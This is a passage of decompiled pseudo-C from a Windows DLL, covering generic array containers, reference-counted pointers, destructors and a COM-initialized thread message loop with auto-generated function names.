    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10042C0D) --------------------------------------------------------
int __thiscall sub_10042C0D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B64FF);
  return this[3] + 4 * a2;
}

//----- (10042C2B) --------------------------------------------------------
int __thiscall sub_10042C2B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B650A);
  return this[3] + 4 * a2;
}

//----- (10042C49) --------------------------------------------------------
void __thiscall sub_10042C49(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (10042C6B) --------------------------------------------------------
int __thiscall sub_10042C6B(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10042C8F) --------------------------------------------------------
BOOL __thiscall sub_10042C8F(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10042C9A) --------------------------------------------------------
int __thiscall sub_10042C9A(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (10042CD9) --------------------------------------------------------
unsigned int __thiscall sub_10042CD9(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B650B);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10042D4B) --------------------------------------------------------
unsigned int __thiscall sub_10042D4B(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10042D73) --------------------------------------------------------
unsigned int __stdcall sub_10042D73(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10042D84) --------------------------------------------------------
unsigned int __thiscall sub_10042D84(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10042DE1) --------------------------------------------------------
void __thiscall sub_10042DE1(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10042EAB) --------------------------------------------------------
_DWORD *__userpurge sub_10042EAB@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10042EEF) --------------------------------------------------------
void __thiscall sub_10042EEF(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10043045((int)this);
}

//----- (10042F42) --------------------------------------------------------
_DWORD *__userpurge sub_10042F42@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10042F86) --------------------------------------------------------
void __thiscall sub_10042F86(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1004307F((int)this);
}

//----- (10042FC5) --------------------------------------------------------
void *__thiscall sub_10042FC5(void *Block, char a2)
{
  sub_10042AEF((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10042FE1) --------------------------------------------------------
_DWORD *__stdcall sub_10042FE1(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_1009591C;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009591C: using guessed type int (__thiscall *off_1009591C)(void *Block, char);

//----- (10043010) --------------------------------------------------------
void *__usercall sub_10043010@<eax>(_DWORD *a1@<esi>)
{
  void *result; // eax

  a1[1] = 0;
  a1[2] = 16;
  result = operator new(0x40u);
  a1[3] = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10043045) --------------------------------------------------------
void __usercall sub_10043045(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1004307F) --------------------------------------------------------
void __usercall sub_1004307F(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100430C9) --------------------------------------------------------
unsigned int *__userpurge sub_100430C9@<eax>(unsigned __int16 a1@<bx>, unsigned int *a2, unsigned int pExceptionObject)
{
  int v4[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v5; // [esp+20h] [ebp-4h]

  sub_1003B021(a2);
  v5 = 0;
  *a2 = (unsigned int)&off_10095A38;
  sub_10044269(a2 + 25, a1);
  sub_10017224((int)(a2 + 29));
  sub_1003F06B(a2 + 38, 0);
  a2[40] = pExceptionObject;
  a2[41] = a1;
  sub_1000AB64(a2 + 42, 0);
  sub_10047E1D(a2 + 44);
  LOBYTE(v5) = 5;
  sub_1001DD96(a2);
  sub_10041E63(v4);
  LOBYTE(v5) = 6;
  pExceptionObject = a2[46];
  (*(void (__thiscall **)(int *, unsigned int *))(v4[0] + 36))(v4, &pExceptionObject);
  if ( sub_10041EEA((int)v4, 0x1388u) == -1 )
  {
    sub_10043297((int *)a2, 2000);
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  LOBYTE(v5) = 5;
  sub_10041E8A((int)v4);
  return a2;
}
// 10095A38: using guessed type int (__thiscall *off_10095A38)(void *Block, char);

//----- (100431CB) --------------------------------------------------------
int *__thiscall sub_100431CB(int *Block, char a2)
{
  sub_100431E7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100431E7) --------------------------------------------------------
LONG __thiscall sub_100431E7(int *this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *this = (int)&off_10095A38;
  v4 = 6;
  if ( (*(int (__thiscall **)(int *))(*this + 52))(this) == 3 )
    sub_10043297(this, 2000);
  v4 = 4;
  sub_10047EAC(this + 44);
  LOBYTE(v4) = 3;
  sub_10009742(this + 42);
  LOBYTE(v4) = 2;
  sub_1003F0AF(this + 38);
  LOBYTE(v4) = 1;
  sub_100172B1(this + 29);
  LOBYTE(v4) = 0;
  sub_100442F4(this + 25);
  v4 = -1;
  return sub_1003B084(this);
}
// 10095A38: using guessed type int (__thiscall *off_10095A38)(void *Block, char);

//----- (10043297) --------------------------------------------------------
int __thiscall sub_10043297(int *this, int a2)
{
  int result; // eax
  int v4; // ecx
  int v5; // eax
  WPARAM v6; // [esp-8h] [ebp-30h] BYREF
  int v7; // [esp-4h] [ebp-2Ch]
  _DWORD v8[4]; // [esp+0h] [ebp-28h] BYREF
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  pExceptionObject[2] = v8;
  pExceptionObject[1] = this;
  v10 = 0;
  result = (*(int (__thiscall **)(int *))(*this + 52))(this);
  if ( result == 3 )
  {
    v7 = v4;
    v6 = v4;
    v8[3] = &v6;
    sub_1003F06B(&v6, 0);
    LOBYTE(v10) = 0;
    sub_10043379(this, v6, v7);
    v7 = 0;
    v6 = 0;
    v5 = sub_1001A85E(this);
    if ( !PostThreadMessageA(v5, 0x12u, v6, v7) )
    {
      sub_10016441(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    return (*(int (__thiscall **)(int *, int, _DWORD))(*this + 64))(this, a2, 0);
  }
  return result;
}
// 100432BE: variable 'v4' is possibly undefined

//----- (10043379) --------------------------------------------------------
void __thiscall sub_10043379(int *this, int a2, int a3)
{
  int v4; // eax
  int v5; // [esp+8h] [ebp-14h] BYREF
  int pExceptionObject; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  sub_100171BE(this + 29, &v5);
  LOBYTE(v7) = 1;
  sub_10044837(this + 38, &a2);
  LOBYTE(v7) = 0;
  sub_100171F2(&v5);
  if ( (*(int (__thiscall **)(int *))(*this + 52))(this) != 3
    || (v4 = sub_1001A85E(this), !PostThreadMessageA(v4, 0x40Du, 0, 0)) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v7 = -1;
  sub_1003F0AF(&a2);
}

//----- (1004340E) --------------------------------------------------------
int __thiscall sub_1004340E(int this)
{
  int v2; // eax
  DWORD v3; // eax
  bool v5; // [esp+13h] [ebp-35h]
  HANDLE pHandles; // [esp+14h] [ebp-34h] BYREF
  int (__thiscall **v7)(void *, char); // [esp+18h] [ebp-30h] BYREF
  struct tagMSG Msg; // [esp+1Ch] [ebp-2Ch] BYREF
  int v9; // [esp+44h] [ebp-4h]

  pHandles = CreateEventA(0, 1, 0, 0);
  v5 = pHandles != 0;
  v7 = &off_10094EC8;
  v2 = CoInitializeEx(0, 0);
  if ( v2 < 0 )
    sub_10032C53(v2);
  v9 = 0;
  PeekMessageA(&Msg, 0, 0x400u, 0x400u, 0);
  SetEvent(*(HANDLE *)(this + 184));
  while ( v5 )
  {
    v3 = MsgWaitForMultipleObjects(1u, &pHandles, 0, 0xFFFFFFFF, 8u);
    if ( !v3 )
      break;
    if ( v3 == 1 )
    {
      while ( PeekMessageA(&Msg, 0, 0, 0, 1u) )
      {
        if ( Msg.message == 18 )
        {
          v5 = 0;
        }
        else if ( Msg.message == 1037 )
        {
          sub_1004351E(this);
        }
        else
        {
          DispatchMessageA(&Msg);
        }
      }
    }
    else
    {
      (*(void (__thiscall **)(_DWORD, int, DWORD))(**(_DWORD **)(this + 160) + 16))(*(_DWORD *)(this + 160), 2, v3);
    }
  }
  sub_1004367F((int *)this);
  v9 = -1;
  sub_10032C92(&v7);
  return 0;
}
// 10094EC8: using guessed type int (__thiscall *off_10094EC8)(void *Block, char);

//----- (1004351E) --------------------------------------------------------
void __stdcall sub_1004351E(int a1)
{
  int v1; // esi
  int v2; // ecx
  int v3; // eax
  _DWORD v4[4]; // [esp-10h] [ebp-4Ch] BYREF
  int v5; // [esp+0h] [ebp-3Ch] BYREF
  void *v6[2]; // [esp+10h] [ebp-2Ch] BYREF
  int v7[2]; // [esp+18h] [ebp-24h] BYREF
  int v8[4]; // [esp+20h] [ebp-1Ch] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v8[3] = (int)&v5;
  v9 = 0;
  sub_1003F06B(v7, 0);
  LOBYTE(v9) = 1;
  sub_100171BE((int *)(a1 + 116), v6);
  LOBYTE(v9) = 2;
  sub_10044837(v7, (_DWORD *)(a1 + 152));
  LOBYTE(v9) = 1;
  sub_100171F2(v6);
  v1 = v7[0];
  if ( v7[0] )
  {
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 160) + 12))(*(_DWORD *)(a1 + 160)) )
    {
      LOBYTE(v9) = 3;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v1 + 4))(v1, v8);
      LOBYTE(v9) = 4;
      if ( !*(_DWORD *)(a1 + 168)
        || (*(unsigned __int8 (__thiscall **)(int, _DWORD))(*(_DWORD *)v8[0] + 24))(v8[0], *(_DWORD *)(a1 + 168)) )
      {
        v4[1] = v2;
        v4[0] = v2;
        v8[2] = (int)v4;
        sub_1000AB50(v8, v4);
        LOBYTE(v9) = 5;
        v3 = **(_DWORD **)(a1 + 160);
        LOBYTE(v9) = 4;
        (*(void (**)(void))(v3 + 8))();
        sub_1000ABA8((_DWORD *)(a1 + 168), v8);
      }
      LOBYTE(v9) = 3;
      sub_10009742(v8);
      v9 = 1;
    }
    (*(void (__thiscall **)(int, void **, int))(*(_DWORD *)v7[0] + 8))(v7[0], v6, 3);
    LOBYTE(v9) = 7;
    sub_10043739(v6[0], a1);
    sub_100438B9(a1);
    LOBYTE(v9) = 1;
    sub_10044882(v6);
  }
  else
  {
    sub_1004367F((int *)a1);
  }
  LOBYTE(v9) = 0;
  sub_1003F0AF(v7);
}
// 100435B9: variable 'v2' is possibly undefined

//----- (1004367F) --------------------------------------------------------
_DWORD *__stdcall sub_1004367F(int *a1)
{
  int v2; // [esp+0h] [ebp-24h] BYREF
  _DWORD v3[3]; // [esp+Ch] [ebp-18h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  v3[2] = &v2;
  v4 = 0;
  sub_100171BE(a1 + 29, v3);
  LOBYTE(v4) = 1;
  sub_10044827(a1 + 38);
  LOBYTE(v4) = 0;
  sub_100171F2(v3);
  sub_1004370A((int)a1);
  sub_100438B9((int)a1);
  return sub_10044867(a1 + 42);
}

//----- (1004370A) --------------------------------------------------------
unsigned int __usercall sub_1004370A@<eax>(int a1@<eax>)
{
  int v1; // esi
  unsigned int v2; // edi
  unsigned int result; // eax

  v1 = a1 + 100;
  v2 = 0;
  result = (*(int (__thiscall **)(int))(*(_DWORD *)(a1 + 100) + 4))(a1 + 100);
  if ( result )
  {
    do
    {
      *(_BYTE *)((*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v1 + 44))(v1, v2++) + 8) = 0;
      result = (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
    }
    while ( v2 < result );
  }
  return result;
}

//----- (10043739) --------------------------------------------------------
__int16 __thiscall sub_10043739(void *this, int a2)
{
  int v3; // edi
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v10; // [esp-Ch] [ebp-50h] BYREF
  int v11; // [esp-8h] [ebp-4Ch]
  int v12; // [esp+0h] [ebp-44h] BYREF
  int v13[3]; // [esp+10h] [ebp-34h] BYREF
  char v14[8]; // [esp+1Ch] [ebp-28h] BYREF
  int *v15; // [esp+24h] [ebp-20h]
  int pExceptionObject; // [esp+28h] [ebp-1Ch] BYREF
  int v17; // [esp+2Ch] [ebp-18h]
  unsigned int i; // [esp+30h] [ebp-14h]
  int *v19; // [esp+34h] [ebp-10h]
  int v20; // [esp+40h] [ebp-4h]

  v19 = &v12;
  v17 = 0;
  v20 = 0;
  v3 = a2;
  sub_1004370A(a2);
  for ( i = 0; ; ++i )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    if ( i >= v4 )
      break;
    v5 = (_DWORD *)(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 48))(this, i);
    v11 = v6;
    v10 = v6;
    v15 = &v10;
    sub_100448BE(v5, &v10);
    LOBYTE(v20) = 0;
    if ( !sub_10043867((char *)v3, v10, v11)
      && (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)(v3 + 100) + 4))(v3 + 100) < *(_DWORD *)(v3 + 164) )
    {
      sub_1000999B((int)v13, 1);
      LOBYTE(v20) = 2;
      v7 = (_DWORD *)(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 48))(this, i);
      v8 = (_DWORD *)(*(int (__thiscall **)(_DWORD, char *, _DWORD))(*(_DWORD *)*v7 + 4))(
                       *v7,
                       v14,
                       *(_DWORD *)(v3 + 160));
      LOBYTE(v20) = 3;
      sub_1004423C(v13, v8);
      LOBYTE(v20) = 2;
      sub_1000AB17(v14);
      if ( !v13[0] )
      {
        sub_10016441(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(v3 + 100) + 36))(v3 + 100, v13);
      ++v17;
      LOBYTE(v20) = 0;
      sub_1000AEE5(v13);
      v3 = a2;
    }
  }
  return v17;
}
// 1004377D: variable 'v6' is possibly undefined

//----- (10043867) --------------------------------------------------------
char __thiscall sub_10043867(char *this, int a2, int a3)
{
  char v3; // bl
  char *v4; // esi
  int v5; // eax

  v3 = 0;
  v4 = this + 100;
  v5 = (*(int (__thiscall **)(int, char *))(*(_DWORD *)a2 + 8))(a2, this + 100);
  if ( v5 != 0xFFFFFF )
  {
    *(_BYTE *)((*(int (__thiscall **)(char *, int))(*(_DWORD *)v4 + 44))(v4, v5) + 8) = 1;
    v3 = 1;
  }
  sub_100448D2(&a2);
  return v3;
}

//----- (100438B9) --------------------------------------------------------
__int16 __usercall sub_100438B9@<ax>(int a1@<eax>)
{
  int v1; // esi
  __int16 v2; // bx
  int v3; // edi
  _DWORD *v4; // eax

  v1 = a1 + 100;
  v2 = 0;
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)(a1 + 100) + 4))(a1 + 100);
  while ( --v3 >= 0 )
  {
    if ( !*(_BYTE *)((*(int (__thiscall **)(int, int))(*(_DWORD *)v1 + 44))(v1, v3) + 8) )
    {
      v4 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v1 + 44))(v1, v3);
      sub_10044AC5(v4);
      (*(void (__thiscall **)(int, int))(*(_DWORD *)v1 + 40))(v1, v3);
      ++v2;
    }
  }
  return v2;
}

//----- (100438FE) --------------------------------------------------------
_DWORD *__thiscall sub_100438FE(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10043EF6(this, v3, 0);
  else
    v4 = 0;
  sub_10044925(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004395B) --------------------------------------------------------
_DWORD *__thiscall sub_1004395B(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10044066(this, v3, 0);
  else
    v4 = 0;
  sub_100449BC(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100439B8) --------------------------------------------------------
_DWORD *__thiscall sub_100439B8(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10043EF6(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10044925(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10043A1D) --------------------------------------------------------
_DWORD *__thiscall sub_10043A1D(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10044066(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100449BC(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10043A82) --------------------------------------------------------
_DWORD *__thiscall sub_10043A82(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10043EF6(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10044925(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10043B01) --------------------------------------------------------
_DWORD *__thiscall sub_10043B01(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10044066(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100449BC(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10043B80) --------------------------------------------------------
void *__thiscall sub_10043B80(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074A83;
  *this = &off_10095A90;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095A90: using guessed type int (__thiscall *off_10095A90)(void *Block, char);

//----- (10043BAA) --------------------------------------------------------
int *__thiscall sub_10043BAA(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10043E85(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10043C02: variable 'v5' is possibly undefined

//----- (10043C1D) --------------------------------------------------------
int *__thiscall sub_10043C1D(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10043EC5(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10043C75: variable 'v5' is possibly undefined

//----- (10043C90) --------------------------------------------------------
void __thiscall sub_10043C90(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10044969(v2);
}

//----- (10043CCE) --------------------------------------------------------
void __thiscall sub_10043CCE(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10044969(v3);
}

//----- (10043D0F) --------------------------------------------------------
void __thiscall sub_10043D0F(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10044969(v2);
}

//----- (10043D4D) --------------------------------------------------------
int __thiscall sub_10043D4D(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10044A00(v4);
  return v2;
}

//----- (10043D91) --------------------------------------------------------
int __thiscall sub_10043D91(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10044969(v4);
  return v2;
}

//----- (10043DD5) --------------------------------------------------------
void __thiscall sub_10043DD5(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10044969(v1);
}

//----- (10043E2A) --------------------------------------------------------
